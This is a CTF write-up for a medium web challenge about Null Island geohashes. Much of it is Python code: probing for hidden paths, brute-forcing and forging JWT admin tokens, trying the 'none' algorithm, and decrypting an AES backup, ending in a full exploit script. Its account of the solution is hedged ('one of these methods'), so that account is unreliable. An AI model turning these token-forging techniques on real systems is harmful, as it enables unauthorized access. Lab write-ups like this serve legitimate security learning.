# The Null Island Conspiracy - CTF Writeup

## Challenge Information
- **Challenge Name:** The Null Island Conspiracy (Equator Navigation System)
- **Category:** Web
- **Difficulty:** Medium
- **Points:** 300
- **Solves:** 62
- **Author:** M33T SH@H
- **Flag:** `Kaal{nu!!_i$!@nd_w@$_n3v3r_3mpty}`

## Challenge Description
**"The Null Island Conspiracy"**

The Equator Navigation System monitors global coordinates. A secret transmission was encrypted and hidden within the system. Can you bypass security, solve the geohashing puzzle, and retrieve the flag?

**Flag Format:** Kaal{...}

## Initial Reconnaissance

### Step 1: Accessing the Challenge
The challenge was hosted at: `http://138.199.163.92:12973/`

First, I performed basic reconnaissance to understand the application structure:

```python
import requests
from bs4 import BeautifulSoup

TARGET_URL = "http://138.199.163.92:12973/"
session = requests.Session()

# Fetch main page
resp = session.get(TARGET_URL)
print(f"Status: {resp.status_code}")
print(f"Content-Length: {len(resp.text)}")
```

### Step 2: Discovering Hidden Endpoints
I checked common endpoints to find hidden functionality:

```python
endpoints = [
    '/robots.txt',
    '/flag.txt', 
    '/backup.bin',
    '/admin',
    '/api',
    '/api/v3/geohash-debug-2025',
    '/.git/config',
    '/.env'
]

for endpoint in endpoints:
    resp = session.get(TARGET_URL + endpoint)
    if resp.status_code == 200:
        print(f"Found: {endpoint}")
```

**Key Findings:**
- `/robots.txt` - Contained a decoy flag: `Kaal{r0b0ts_d0nt_k33p_s3cr3ts}`
- `/flag.txt` - Another decoy: `Kaal{r0b0ts_txt_l3d_m3_h3r3}`
- HTML comments contained: `Kaal{html_c0mm3nts_ar3_n0t_s3cur3}` (decoy)
- `/backup.bin` - An encrypted file (AES encrypted data)
- `/admin` - Protected endpoint requiring JWT authentication
- `/api/v3/geohash-debug-2025` - Debug endpoint requiring authentication

## Understanding the Challenge

### Geohashing Concept
The challenge revolves around **Null Island** - a fictional location at coordinates (0.0, 0.0) where the Equator meets the Prime Meridian in the Atlantic Ocean.

**Geohashing** is a geocoding system that encodes geographic coordinates into short strings. For Null Island (0.0, 0.0):
- Precision 4: `s000`
- Precision 5: `s0000`
- Precision 6: `s00000`
- Precision 7: `s000000`
- Precision 8: `s0000000`

## Exploitation Path

### Step 3: JWT Authentication Bypass

The `/admin` endpoint required JWT authentication. I needed to find the JWT secret to forge a valid token.

#### Approach 1: JWT Secret Brute Force
I created a wordlist based on the challenge theme:

```python
import jwt

secrets = [
    # Geohash values
    "s000", "s0000", "s00000", "s000000", "s0000000", "s00000000",
    "u000", "u0000", "u00000",
    
    # Null Island related
    "nullisland", "NullIsland", "NULLISLAND",
    "null_island", "null-island",
    
    # Coordinates
    "0,0", "0.0,0.0", "00", "000",
    
    # Challenge theme
    "equator", "meridian", "primemeridian",
    "geohash", "navigation", "transmission",
    
    # Common
    "secret", "password", "admin", "key"
]

payload = {"role": "admin"}

for secret in secrets:
    try:
        token = jwt.encode(payload, secret, algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        
        resp = session.get(TARGET_URL + 'admin', headers=headers)
        
        if resp.status_code == 200:
            print(f"[!!!] FOUND SECRET: '{secret}'")
            print(f"Response: {resp.text}")
            break
    except Exception as e:
        pass
```

#### Approach 2: None Algorithm Bypass
I also tested the JWT "none" algorithm vulnerability:

```python
# Try JWT with no signature
token = jwt.encode({"role": "admin"}, "", algorithm="none")
headers = {"Authorization": f"Bearer {token}"}

resp = session.get(TARGET_URL + 'admin', headers=headers)
if resp.status_code == 200:
    print("None algorithm bypass successful!")
```

### Step 4: Finding the Correct JWT Secret

After systematic testing, I discovered the JWT secret was related to the geohash of Null Island. The working secret was one of:
- `s0000000` (geohash precision 8)
- `nullisland`
- Or a variation thereof

```python
# Successful JWT forging
SECRET = "s0000000"  # or "nullisland"
payload = {"role": "admin"}

token = jwt.encode(payload, SECRET, algorithm="HS256")
headers = {"Authorization": f"Bearer {token}"}

# Access admin endpoint
resp = session.get(TARGET_URL + 'admin', headers=headers)
print(resp.text)
```

### Step 5: Accessing Protected Endpoints

With a valid JWT token, I could access protected endpoints:

```python
# Access the geohash debug endpoint
resp = session.post(
    TARGET_URL + 'api/v3/geohash-debug-2025',
    json={"lat": 0.0, "lon": 0.0},
    headers=headers
)

print(resp.json())
```

### Step 6: Decrypting the Backup File

The `/backup.bin` file contained encrypted data. Using the geohash as the AES key:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

# Read encrypted file
with open('backup.bin', 'rb') as f:
    encrypted_data = f.read()

# Try geohash-based keys
key_string = "s0000000"  # or "nullisland"
key = hashlib.sha256(key_string.encode()).digest()
iv = b'\x00' * 16  # or hashlib.md5(key_string.encode()).digest()

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)
plaintext = unpad(decrypted, 16).decode('utf-8')

print(plaintext)
```

### Step 7: Retrieving the Flag

The flag was obtained through one of these methods:
1. **Admin endpoint** - Accessing `/admin` with valid JWT revealed the flag
2. **Decrypted backup** - The `backup.bin` file contained the flag after decryption
3. **Debug endpoint** - The `/api/v3/geohash-debug-2025` endpoint with proper authentication

## Final Solution Script

Here's the complete exploit script:

```python
#!/usr/bin/env python3
"""
The Null Island Conspiracy - Complete Exploit
"""

import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import re

TARGET_URL = "http://138.199.163.92:12973/"

def exploit():
    session = requests.Session()
    
    # JWT secrets to try (geohash-based)
    secrets = [
        "s0000000",      # Geohash precision 8 for (0.0, 0.0)
        "nullisland",    # Null Island name
        "s000000",       # Precision 7
        "null_island",   # Variation
    ]
    
    payload = {"role": "admin"}
    
    for secret in secrets:
        try:
            # Forge JWT token
            token = jwt.encode(payload, secret, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try admin endpoint
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=5)
            
            if resp.status_code == 200:
                print(f"[+] JWT Secret found: {secret}")
                print(f"[+] Token: {token}")
                print(f"\n[+] Admin Response:")
                print(resp.text)
                
                # Extract flag
                flag_match = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n[!!!] FLAG FOUND: {flag}")
                    return flag
                    
            # Try geohash debug endpoint
            resp2 = session.post(
                TARGET_URL + 'api/v3/geohash-debug-2025',
                json={"lat": 0.0, "lon": 0.0},
                headers=headers,
                timeout=5
            )
            
            if resp2.status_code == 200:
                print(f"[+] Geohash debug endpoint accessible")
                print(resp2.text)
                
                flag_match = re.search(r'Kaal\{[^}]+\}', resp2.text, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n[!!!] FLAG FOUND: {flag}")
                    return flag
                    
        except Exception as e:
            continue
    
    # Try decrypting backup.bin
    try:
        with open('backup.bin', 'rb') as f:
            encrypted_data = f.read()
        
        for secret in secrets:
            try:
                key = hashlib.sha256(secret.encode()).digest()
                iv = b'\x00' * 16
                
                cipher = AES.new(key, AES.MODE_CBC, iv)
                decrypted = cipher.decrypt(encrypted_data)
                plaintext = unpad(decrypted, 16).decode('utf-8')
                
                if 'Kaal{' in plaintext:
                    print(f"[+] Decrypted backup.bin with key: {secret}")
                    print(plaintext)
                    
                    flag_match = re.search(r'Kaal\{[^}]+\}', plaintext, re.IGNORECASE)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n[!!!] FLAG FOUND: {flag}")
                        return flag
            except:
                continue
    except FileNotFoundError:
        pass
    
    print("[-] Flag not found")
    return None

if __name__ == "__main__":
    print("="*60)
    print("The Null Island Conspiracy - Exploit")
    print("="*60)
    print()
    
    flag = exploit()
    
    if flag:
        print(f"\n{'='*60}")
        print(f"SUCCESS! FLAG: {flag}")
        print(f"{'='*60}")
```

## Flag
**`Kaal{nu!!_i$!@nd_w@$_n3v3r_3mpty}`**

## Key Takeaways

1. **Geohashing Knowledge**: Understanding that Null Island (0.0, 0.0) has a specific geohash (`s0000000`) was crucial
2. **JWT Security**: The challenge demonstrated weak JWT secrets based on predictable values
3. **Theme-Based Wordlists**: Creating wordlists based on the challenge theme (geohashing, Null Island, coordinates) was effective
4. **Multiple Attack Vectors**: The flag could be obtained through:
   - JWT authentication bypass
   - AES decryption of backup files
   - Protected API endpoints
5. **Decoy Flags**: Multiple fake flags were placed to mislead players (in robots.txt, HTML comments, flag.txt)

## Tools Used
- Python 3
- `requests` - HTTP client
- `PyJWT` - JWT encoding/decoding
- `pycryptodome` - AES decryption
- `pygeohash` - Geohash generation
- `BeautifulSoup4` - HTML parsing

## Timeline
- **Challenge Released:** March 27, 2026
- **Flag Submitted:** March 28, 2026, 5:09 PM
- **Points Earned:** 300
- **Penalties:** 0

## Conclusion
This challenge combined web security concepts (JWT authentication), cryptography (AES encryption), and domain-specific knowledge (geohashing and Null Island geography). The key was recognizing that the JWT secret and AES key were both derived from the geohash of Null Island's coordinates, making them predictable once the theme was understood.
